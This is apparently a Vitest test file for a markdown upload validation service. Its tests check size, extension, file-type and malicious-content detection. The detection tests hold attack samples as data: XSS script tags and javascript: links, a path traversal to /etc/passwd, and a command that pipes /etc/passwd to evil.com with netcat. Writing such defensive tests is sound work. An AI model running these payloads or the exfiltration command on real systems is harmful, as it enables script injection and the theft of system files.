// packages/batch-backend/tests/infrastructure.file-validation-service.test.ts
//
// Comprehensive tests for file validation service covering security scenarios,
// edge cases, and malicious file detection.

import { describe, it, expect, beforeEach, afterEach } from 'vitest';
import {
  FileValidationService,
  ValidationConfig,
} from '../src/infrastructure/file-validation-service';

describe('FileValidationService', () => {
  let validationService: FileValidationService;
  let testConfig: ValidationConfig;

  beforeEach(() => {
    testConfig = {
      maxFileSize: 10 * 1024 * 1024, // 10MB
      allowedMimeTypes: ['text/markdown', 'text/plain'],
      allowedExtensions: ['md', 'markdown', 'txt'],
      enableContentScanning: true,
      enableMaliciousPatternDetection: true,
    };
    validationService = new FileValidationService(testConfig);
  });

  describe('File Size Validation', () => {
    it('should accept files within size limit', async () => {
      const smallBuffer = Buffer.alloc(1024); // 1KB
      const result = await validationService.validateFile(smallBuffer, 'test.md');

      expect(result.isValid).toBe(true);
      expect(result.errors).toHaveLength(0);
      expect(result.size).toBe(1024);
    });

    it('should reject files exceeding size limit', async () => {
      const largeBuffer = Buffer.alloc(15 * 1024 * 1024); // 15MB (over 10MB limit)
      const result = await validationService.validateFile(largeBuffer, 'large.md');

      expect(result.isValid).toBe(false);
      expect(result.errors).toHaveLength(1);
      expect(result.errors[0].code).toBe('FILE_SIZE_EXCEEDED');
    });

    it('should warn about files approaching size limit', async () => {
      const nearLimitBuffer = Buffer.alloc(8 * 1024 * 1024); // 8MB (80% of 10MB)
      const result = await validationService.validateFile(nearLimitBuffer, 'near-limit.md');

      expect(result.isValid).toBe(true);
      // Should have warnings about size but still be valid
      expect(result.warnings.length).toBeGreaterThanOrEqual(0);
    });
  });

  describe('File Extension Validation', () => {
    it('should accept valid markdown extensions', async () => {
      const buffer = Buffer.from('# Test Content');

      const mdResult = await validationService.validateFile(buffer, 'test.md');
      expect(mdResult.isValid).toBe(true);

      const markdownResult = await validationService.validateFile(buffer, 'test.markdown');
      expect(markdownResult.isValid).toBe(true);

      const txtResult = await validationService.validateFile(buffer, 'test.txt');
      expect(txtResult.isValid).toBe(true);
    });

    it('should reject invalid extensions', async () => {
      const buffer = Buffer.from('test content');

      const phpResult = await validationService.validateFile(buffer, 'test.php');
      expect(phpResult.isValid).toBe(false);
      expect(phpResult.errors[0].code).toBe('FILE_EXTENSION_NOT_ALLOWED');

      const exeResult = await validationService.validateFile(buffer, 'test.exe');
      expect(exeResult.isValid).toBe(false);
      expect(exeResult.errors[0].code).toBe('FILE_EXTENSION_NOT_ALLOWED');
    });

    it('should reject files without extensions', async () => {
      const buffer = Buffer.from('test content');
      const result = await validationService.validateFile(buffer, 'testfile');

      expect(result.isValid).toBe(false);
      expect(result.errors[0].code).toBe('FILE_EXTENSION_MISSING');
    });
  });

  describe('Magic Number Validation', () => {
    it('should correctly identify markdown files by content', async () => {
      const markdownBuffer = Buffer.from('# This is a test markdown file\n\n## Section');
      const result = await validationService.validateFile(markdownBuffer, 'test.md');

      expect(result.isValid).toBe(true);
      expect(result.mimeType).toMatch(/text\/(markdown|plain)/);
      expect(result.fileType).toBe('text');
    });

    it('should detect file type mismatch (executable pretending to be text)', async () => {
      // Simulate an executable file with .md extension
      const executableBuffer = Buffer.from([0x4d, 0x5a, 0x90, 0x00]); // PE header
      const result = await validationService.validateFile(executableBuffer, 'malicious.md');

      // Should either detect mismatch or flag as suspicious
      expect(result.mimeType).not.toBe('text/markdown');
    });

    it('should handle files with unknown types gracefully', async () => {
      const unknownBuffer = Buffer.from('binary data with no clear type');
      const result = await validationService.validateFile(unknownBuffer, 'test.unknown');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'FILE_TYPE_UNKNOWN')).toBe(true);
    });
  });

  describe('Malicious Pattern Detection', () => {
    it('should detect script injection attempts', async () => {
      const maliciousContent = Buffer.from(`# Normal markdown

<script>alert('xss')</script>

More content`);

      const result = await validationService.validateFile(maliciousContent, 'xss-attempt.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
    });

    it('should detect path traversal attempts', async () => {
      const maliciousContent = Buffer.from(`# Content

../../../etc/passwd

More content`);

      const result = await validationService.validateFile(maliciousContent, 'path-traversal.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
    });

    it('should detect malicious markdown links', async () => {
      const maliciousContent = Buffer.from(`# Content

[Click here](javascript:alert('xss'))

More content`);

      const result = await validationService.validateFile(maliciousContent, 'malicious-link.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
    });

    it('should detect command injection attempts', async () => {
      const maliciousContent = Buffer.from(`# Content

\`\`\`bash
cat /etc/passwd | nc evil.com 8080
\`\`\``);

      const result = await validationService.validateFile(maliciousContent, 'cmd-injection.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MALICIOUS_PATTERN_DETECTED')).toBe(true);
    });
  });

  describe('Content Integrity Validation', () => {
    it('should validate markdown structure', async () => {
      const content = Buffer.from('# Title\n\n## Section\n\nSome text with [unclosed link');
      const result = await validationService.validateFile(content, 'unbalanced.md');

      expect(result.isValid).toBe(true); // Should be valid but with warnings
      expect(result.warnings.some(w => w.code === 'UNBALANCED_BRACKETS')).toBe(true);
    });

    it('should detect invalid UTF-8 characters', async () => {
      const content = Buffer.from([0xff, 0xfe, 0x41, 0x42, 0x43]); // Invalid UTF-8
      const result = await validationService.validateFile(content, 'invalid-utf8.md');

      expect(result.isValid).toBe(true); // Content validation warns but doesn't fail
      expect(result.warnings.some(w => w.code === 'UTF8_ENCODING_ISSUES')).toBe(true);
    });

    it('should detect excessive binary content in text files', async () => {
      // Create content with high binary content ratio
      let content = '# Valid markdown\n\n';
      content += 'A'.repeat(1000); // Text content
      content += '\x00\x01\x02'; // Binary content
      content += 'B'.repeat(1000); // More text content

      const buffer = Buffer.from(content);
      const result = await validationService.validateFile(buffer, 'binary-heavy.md');

      expect(result.warnings.some(w => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
    });

    it('should flag unusually long lines', async () => {
      const longLine = '# Title\n\n' + 'A'.repeat(15000) + '\n';
      const buffer = Buffer.from(longLine);
      const result = await validationService.validateFile(buffer, 'long-lines.md');

      expect(result.warnings.some(w => w.code === 'UNUSUALLY_LONG_LINES')).toBe(true);
    });
  });

  describe('Edge Cases', () => {
    it('should handle empty files', async () => {
      const emptyBuffer = Buffer.alloc(0);
      const result = await validationService.validateFile(emptyBuffer, 'empty.md');

      expect(result.isValid).toBe(true); // Empty files should be valid
      expect(result.size).toBe(0);
    });

    it('should handle files with only whitespace', async () => {
      const whitespaceBuffer = Buffer.from('   \n\n   \t\t   ');
      const result = await validationService.validateFile(whitespaceBuffer, 'whitespace.md');

      expect(result.isValid).toBe(true);
    });

    it('should handle files with null bytes', async () => {
      const nullBuffer = Buffer.from('test\x00content\x00more');
      const result = await validationService.validateFile(nullBuffer, 'null-bytes.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'CONTENT_NOT_READABLE')).toBe(true);
    });

    it('should handle very long filenames', async () => {
      const buffer = Buffer.from('# Test content');
      const longFilename = 'a'.repeat(300) + '.md';
      const result = await validationService.validateFile(buffer, longFilename);

      expect(result.isValid).toBe(true); // Validation should pass
      expect(result.warnings.some(w => w.code === 'FILENAME_TRUNCATED')).toBe(true);
    });
  });

  describe('Configuration Validation', () => {
    it('should throw error for invalid configuration', () => {
      expect(
        () =>
          new FileValidationService({
            ...testConfig,
            maxFileSize: 0,
          })
      ).toThrow('maxFileSize must be greater than 0');
    });

    it('should throw error for empty allowed MIME types', () => {
      expect(
        () =>
          new FileValidationService({
            ...testConfig,
            allowedMimeTypes: [],
          })
      ).toThrow('allowedMimeTypes cannot be empty');
    });

    it('should throw error for empty allowed extensions', () => {
      expect(
        () =>
          new FileValidationService({
            ...testConfig,
            allowedExtensions: [],
          })
      ).toThrow('allowedExtensions cannot be empty');
    });
  });

  describe('Performance and Memory Tests', () => {
    it('should handle large valid markdown files efficiently', async () => {
      const largeContent = '# Large File\n\n' + 'A'.repeat(5 * 1024 * 1024); // 5MB
      const buffer = Buffer.from(largeContent);

      const start = Date.now();
      const result = await validationService.validateFile(buffer, 'large-valid.md');
      const duration = Date.now() - start;

      expect(result.isValid).toBe(true);
      expect(duration).toBeLessThan(5000); // Should complete within 5 seconds
    });

    it('should handle multiple validation requests concurrently', async () => {
      const buffers = Array.from({ length: 10 }, (_, i) =>
        Buffer.from(`# Test ${i}\n\nContent for test ${i}`)
      );

      const promises = buffers.map((buffer, i) =>
        validationService.validateFile(buffer, `test-${i}.md`)
      );

      const results = await Promise.all(promises);

      expect(results).toHaveLength(10);
      results.forEach(result => {
        expect(result.isValid).toBe(true);
      });
    });
  });

  describe('Security Test Scenarios', () => {
    it('should detect ZIP bomb disguised as text', async () => {
      // Simulate a compressed archive content that looks like text
      const zipBombContent = Buffer.from('# Archive Data\n\nPK\x03\x04binary_data_here');
      const result = await validationService.validateFile(zipBombContent, 'archive.md');

      // Should detect this as suspicious due to binary content
      expect(result.warnings.some(w => w.code === 'BINARY_CONTENT_DETECTED')).toBe(true);
    });

    it('should detect polyglot file (valid in multiple formats)', async () => {
      // Create content that could be both markdown and HTML
      const polyglotContent = Buffer.from(`# Title
<script>alert('test')</script>
## Section`);
      const result = await validationService.validateFile(polyglotContent, 'polyglot.md');

      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
    });

    it('should handle Unicode-based attacks', async () => {
      const unicodeAttack = Buffer.from('# Title\n\n[\u202E](javascript:alert("xss"))');
      const result = await validationService.validateFile(unicodeAttack, 'unicode-attack.md');

      // Should detect the javascript: protocol regardless of encoding
      expect(result.isValid).toBe(false);
      expect(result.errors.some(e => e.code === 'MARKDOWN_MALICIOUS_PATTERN')).toBe(true);
    });
  });

  afterEach(() => {
    // Cleanup after each test
  });
});
